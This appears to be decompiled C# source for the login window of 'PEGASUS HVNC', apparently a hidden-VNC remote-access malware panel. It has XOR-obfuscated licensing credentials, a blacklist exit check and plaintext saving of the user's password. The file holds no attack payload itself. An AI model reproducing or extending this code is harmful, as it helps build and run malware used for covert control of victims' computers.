using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using HVNC;
using PEGASUS_LIME.Properties;
using PEGASUS_LIME.Skoteinos_Pegasus;

namespace PEGASUS_LIME.Design
{
	public class Log : Form
	{
		private static readonly string name = info("ZOMKUB");

		private static readonly string pegaid = info("a=Xl3GS?GY");

		private static readonly string pegmystic = info("?o:n8:>=h;2:n<k<hlkh<<i?>8ii:o98<;=:o989?noo?n?ih><:ok=khii<l?>3");

		private static readonly string version = "1.1";

		public static api Darkness = new api(name, pegaid, pegmystic, version);

		public string User = string.Empty;

		public string Pass = string.Empty;

		private IContainer components = null;

		private Guna2DragControl guna2DragControl1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2GroupBox guna2GroupBox1;

		private Label label10;

		private Guna2CustomCheckBox HiddenAccess;

		private PictureBox pictureBox1;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2Button RegisterBtn;

		private Guna2Button LoginBtn;

		private Label label1;

		private Guna2TextBox passwordbox;

		private Guna2TextBox usernamebox;

		public Log()
		{
			InitializeComponent();
		}

		private static string info(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			foreach (uint num in array)
			{
				char value = (char)(num ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		private void LoginBtn_Click(object sender, EventArgs e)
		{
			Darkness.login(usernamebox.Text, passwordbox.Text);
			if (Darkness.response.success)
			{
				if (HiddenAccess.Checked)
				{
					if (!File.Exists(Application.StartupPath + "\\Configuration"))
					{
						Directory.CreateDirectory(Application.StartupPath + "\\Configuration");
						string text = usernamebox.Text + "|" + passwordbox.Text;
						string contents = text;
						File.WriteAllText(Application.StartupPath + "\\Configuration\\LoginRememberMe.ini", contents);
					}
					Hide();
					PEGASUS pEGASUS = new PEGASUS();
					pEGASUS.ShowDialog();
				}
			}
			else
			{
				MsgBox.Show("Oops, something went wrong");
			}
		}

		private void Log_Load(object sender, EventArgs e)
		{
			passwordbox.UseSystemPasswordChar = true;
			Darkness.init();
			if (Darkness.checkblack())
			{
				Environment.Exit(0);
			}
		}

		private void RegisterBtn_Click(object sender, EventArgs e)
		{
			Hide();
			new FrmRegister().ShowDialog();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2GroupBox1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void Log_FormClosed(object sender, FormClosedEventArgs e)
		{
			Application.Exit();
		}

		private void Log_FormClosing(object sender, FormClosingEventArgs e)
		{
			Application.Exit();
		}

		private void HiddenAccess_CheckedChanged(object sender, EventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGASUS_LIME.Design.Log));
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
			label10 = new System.Windows.Forms.Label();
			HiddenAccess = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			RegisterBtn = new Guna.UI2.WinForms.Guna2Button();
			LoginBtn = new Guna.UI2.WinForms.Guna2Button();
			label1 = new System.Windows.Forms.Label();
			passwordbox = new Guna.UI2.WinForms.Guna2TextBox();
			usernamebox = new Guna.UI2.WinForms.Guna2TextBox();
			guna2GroupBox1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
			guna2DragControl1.UseTransparentDrag = true;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ShadowForm1.TargetForm = this;
			guna2GroupBox1.BorderColor = System.Drawing.Color.Black;
			guna2GroupBox1.BorderThickness = 5;
			guna2GroupBox1.Controls.Add(label10);
			guna2GroupBox1.Controls.Add(HiddenAccess);
			guna2GroupBox1.Controls.Add(pictureBox1);
			guna2GroupBox1.Controls.Add(guna2ControlBox2);
			guna2GroupBox1.Controls.Add(RegisterBtn);
			guna2GroupBox1.Controls.Add(LoginBtn);
			guna2GroupBox1.Controls.Add(label1);
			guna2GroupBox1.Controls.Add(passwordbox);
			guna2GroupBox1.Controls.Add(usernamebox);
			guna2GroupBox1.CustomBorderColor = System.Drawing.Color.Black;
			guna2GroupBox1.FillColor = System.Drawing.Color.Transparent;
			guna2GroupBox1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GroupBox1.ForeColor = System.Drawing.Color.Gainsboro;
			guna2GroupBox1.Location = new System.Drawing.Point(11, 21);
			guna2GroupBox1.Name = "guna2GroupBox1";
			guna2GroupBox1.ShadowDecoration.Parent = guna2GroupBox1;
			guna2GroupBox1.Size = new System.Drawing.Size(370, 373);
			guna2GroupBox1.TabIndex = 1;
			guna2GroupBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2GroupBox1_MouseDown);
			label10.AutoSize = true;
			label10.BackColor = System.Drawing.Color.Transparent;
			label10.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label10.ForeColor = System.Drawing.Color.Gainsboro;
			label10.Location = new System.Drawing.Point(37, 216);
			label10.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label10.Name = "label10";
			label10.Size = new System.Drawing.Size(64, 16);
			label10.TabIndex = 147;
			label10.Text = "Autologin";
			label10.Visible = false;
			HiddenAccess.BackColor = System.Drawing.Color.Black;
			HiddenAccess.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			HiddenAccess.CheckedState.BorderRadius = 2;
			HiddenAccess.CheckedState.BorderThickness = 2;
			HiddenAccess.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			HiddenAccess.CheckedState.Parent = HiddenAccess;
			HiddenAccess.ForeColor = System.Drawing.Color.White;
			HiddenAccess.Location = new System.Drawing.Point(9, 209);
			HiddenAccess.Name = "HiddenAccess";
			HiddenAccess.ShadowDecoration.Parent = HiddenAccess;
			HiddenAccess.Size = new System.Drawing.Size(23, 25);
			HiddenAccess.TabIndex = 146;
			HiddenAccess.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			HiddenAccess.UncheckedState.BorderRadius = 2;
			HiddenAccess.UncheckedState.BorderThickness = 2;
			HiddenAccess.UncheckedState.FillColor = System.Drawing.Color.Black;
			HiddenAccess.UncheckedState.Parent = HiddenAccess;
			HiddenAccess.Visible = false;
			HiddenAccess.CheckedChanged += new System.EventHandler(HiddenAccess_CheckedChanged);
			pictureBox1.Image = PEGASUS_LIME.Properties.Resources.pegamatrix;
			pictureBox1.Location = new System.Drawing.Point(112, 57);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(156, 109);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox1.TabIndex = 145;
			pictureBox1.TabStop = false;
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.BackgroundImage = PEGASUS_LIME.Properties.Resources._1;
			guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(327, 3);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.ShowIcon = false;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 31);
			guna2ControlBox2.TabIndex = 123;
			guna2ControlBox2.UseTransparentBackground = true;
			RegisterBtn.Animated = true;
			RegisterBtn.BackColor = System.Drawing.Color.Transparent;
			RegisterBtn.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RegisterBtn.BorderThickness = 1;
			RegisterBtn.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RegisterBtn.CheckedState.FillColor = System.Drawing.Color.Black;
			RegisterBtn.CheckedState.Parent = RegisterBtn;
			RegisterBtn.CustomImages.Parent = RegisterBtn;
			RegisterBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			RegisterBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			RegisterBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			RegisterBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			RegisterBtn.DisabledState.Parent = RegisterBtn;
			RegisterBtn.FillColor = System.Drawing.Color.Black;
			RegisterBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			RegisterBtn.ForeColor = System.Drawing.Color.White;
			RegisterBtn.HoverState.BorderColor = System.Drawing.Color.White;
			RegisterBtn.HoverState.FillColor = System.Drawing.Color.Black;
			RegisterBtn.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RegisterBtn.HoverState.Parent = RegisterBtn;
			RegisterBtn.Location = new System.Drawing.Point(284, 323);
			RegisterBtn.Name = "RegisterBtn";
			RegisterBtn.PressedColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RegisterBtn.ShadowDecoration.Parent = RegisterBtn;
			RegisterBtn.Size = new System.Drawing.Size(83, 37);
			RegisterBtn.TabIndex = 3;
			RegisterBtn.Text = "Register";
			RegisterBtn.Click += new System.EventHandler(RegisterBtn_Click);
			LoginBtn.Animated = true;
			LoginBtn.BackColor = System.Drawing.Color.Transparent;
			LoginBtn.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			LoginBtn.BorderThickness = 1;
			LoginBtn.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			LoginBtn.CheckedState.FillColor = System.Drawing.Color.Black;
			LoginBtn.CheckedState.Parent = LoginBtn;
			LoginBtn.CustomImages.Parent = LoginBtn;
			LoginBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			LoginBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			LoginBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			LoginBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			LoginBtn.DisabledState.Parent = LoginBtn;
			LoginBtn.FillColor = System.Drawing.Color.Black;
			LoginBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			LoginBtn.ForeColor = System.Drawing.Color.White;
			LoginBtn.HoverState.BorderColor = System.Drawing.Color.White;
			LoginBtn.HoverState.FillColor = System.Drawing.Color.Black;
			LoginBtn.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			LoginBtn.HoverState.Parent = LoginBtn;
			LoginBtn.Location = new System.Drawing.Point(9, 323);
			LoginBtn.Name = "LoginBtn";
			LoginBtn.PressedColor = System.Drawing.Color.FromArgb(9, 248, 121);
			LoginBtn.ShadowDecoration.Parent = LoginBtn;
			LoginBtn.Size = new System.Drawing.Size(83, 37);
			LoginBtn.TabIndex = 2;
			LoginBtn.Text = "Login";
			LoginBtn.Click += new System.EventHandler(LoginBtn_Click);
			label1.AutoSize = true;
			label1.BackColor = System.Drawing.Color.Transparent;
			label1.Font = new System.Drawing.Font("Electrolize", 14.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.Gainsboro;
			label1.Location = new System.Drawing.Point(111, 30);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(155, 22);
			label1.TabIndex = 120;
			label1.Text = "PEGASUS HVNC";
			passwordbox.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			passwordbox.Cursor = System.Windows.Forms.Cursors.IBeam;
			passwordbox.DefaultText = "";
			passwordbox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			passwordbox.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			passwordbox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			passwordbox.DisabledState.Parent = passwordbox;
			passwordbox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			passwordbox.FillColor = System.Drawing.Color.Black;
			passwordbox.FocusedState.BorderColor = System.Drawing.Color.White;
			passwordbox.FocusedState.FillColor = System.Drawing.Color.Black;
			passwordbox.FocusedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			passwordbox.FocusedState.Parent = passwordbox;
			passwordbox.Font = new System.Drawing.Font("Electrolize", 9f);
			passwordbox.ForeColor = System.Drawing.Color.White;
			passwordbox.HoverState.BorderColor = System.Drawing.Color.White;
			passwordbox.HoverState.FillColor = System.Drawing.Color.Black;
			passwordbox.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			passwordbox.HoverState.Parent = passwordbox;
			passwordbox.Location = new System.Drawing.Point(9, 280);
			passwordbox.Name = "passwordbox";
			passwordbox.PasswordChar = '\0';
			passwordbox.PlaceholderForeColor = System.Drawing.Color.Gainsboro;
			passwordbox.PlaceholderText = "Password";
			passwordbox.SelectedText = "";
			passwordbox.ShadowDecoration.Parent = passwordbox;
			passwordbox.Size = new System.Drawing.Size(358, 37);
			passwordbox.TabIndex = 1;
			usernamebox.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			usernamebox.Cursor = System.Windows.Forms.Cursors.IBeam;
			usernamebox.DefaultText = "";
			usernamebox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			usernamebox.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			usernamebox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			usernamebox.DisabledState.Parent = usernamebox;
			usernamebox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			usernamebox.FillColor = System.Drawing.Color.Black;
			usernamebox.FocusedState.BorderColor = System.Drawing.Color.White;
			usernamebox.FocusedState.FillColor = System.Drawing.Color.Black;
			usernamebox.FocusedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			usernamebox.FocusedState.Parent = usernamebox;
			usernamebox.Font = new System.Drawing.Font("Electrolize", 9f);
			usernamebox.ForeColor = System.Drawing.Color.White;
			usernamebox.HoverState.BorderColor = System.Drawing.Color.White;
			usernamebox.HoverState.FillColor = System.Drawing.Color.Black;
			usernamebox.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			usernamebox.HoverState.Parent = usernamebox;
			usernamebox.Location = new System.Drawing.Point(9, 237);
			usernamebox.Name = "usernamebox";
			usernamebox.PasswordChar = '\0';
			usernamebox.PlaceholderForeColor = System.Drawing.Color.Gainsboro;
			usernamebox.PlaceholderText = "Username";
			usernamebox.SelectedText = "";
			usernamebox.ShadowDecoration.Parent = usernamebox;
			usernamebox.Size = new System.Drawing.Size(358, 37);
			usernamebox.TabIndex = 0;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.Black;
			base.ClientSize = new System.Drawing.Size(403, 414);
			base.Controls.Add(guna2GroupBox1);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.White;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Log";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Log";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Log_FormClosing);
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Log_FormClosed);
			base.Load += new System.EventHandler(Log_Load);
			guna2GroupBox1.ResumeLayout(false);
			guna2GroupBox1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
		}
	}
}
